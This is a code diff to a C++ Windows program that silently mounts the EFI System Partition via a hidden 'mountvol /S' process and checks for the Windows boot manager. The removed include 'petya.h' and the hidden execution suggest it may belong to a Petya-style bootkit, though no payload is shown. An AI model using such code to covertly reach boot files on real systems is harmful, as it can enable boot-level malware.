@@ -2,7 +2,7 @@
 
 #include "uefi.h"
 #include "utils.h"
-#include "petya.h"
+#include "config.h"
 
 std::wstring fnFindESP()
 {
@@ -20,35 +20,37 @@ std::wstring fnMountESP(int nIdxDrive)
 {
     for (wchar_t c = L'Z'; c >= L'D'; c--)
     {
-        std::wstring szLetter = std::wstring(1, c);
-        if (DRIVE_NO_ROOT_DIR == GetDriveTypeW((szLetter + L"\\").c_str()))
+        std::wstring szLetter = std::wstring(1, c) + L":";
+
+        if (DRIVE_NO_ROOT_DIR != GetDriveTypeW((szLetter + L"\\").c_str()))
+            continue;   // letter already in use
+
+        // Fixed: removed extra ":" — szLetter is already "Z:"
+        std::wstring szCmd = L"cmd.exe /c mountvol " + szLetter + L" /S";
+
+        STARTUPINFOW si = {};
+        PROCESS_INFORMATION pi = {};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+
+        std::vector<wchar_t> buffer(szCmd.begin(), szCmd.end());
+        buffer.push_back(0);
+
+        if (CreateProcessW(nullptr, buffer.data(), nullptr, nullptr,
+                FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
         {
-            // try to mount ESP
-            std::wstring szCmd = L"cmd.exe /c mountvol " + szLetter + L":" + L" /S";
+            WaitForSingleObject(pi.hProcess, 5000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
 
-            STARTUPINFOW si = {};
-            PROCESS_INFORMATION pi = {};
-            si.cb = sizeof(si);
-            si.dwFlags = STARTF_USESHOWWINDOW;
-            si.wShowWindow = SW_HIDE;
-
-            std::vector<wchar_t> buffer(szCmd.begin(), szCmd.end());
-            buffer.push_back(0);
-
-            if (CreateProcessW(nullptr, buffer.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
-            {
-                WaitForSingleObject(pi.hProcess, 5000);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            }
-
-            // check if it worked
-            std::wstring szTest = szLetter + BOOTMGFW_PATH;
-            if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(szTest.c_str()))
-            {
-                printf("ESP is mounted at %ls\n", szLetter.c_str());
-                return szLetter;
-            }
+        // Check if mount succeeded
+        std::wstring szTest = szLetter + L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
+        if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(szTest.c_str()))
+        {
+            printf("[+] ESP mounted at %ls\n", szLetter.c_str());
+            return szLetter;
         }
     }
 
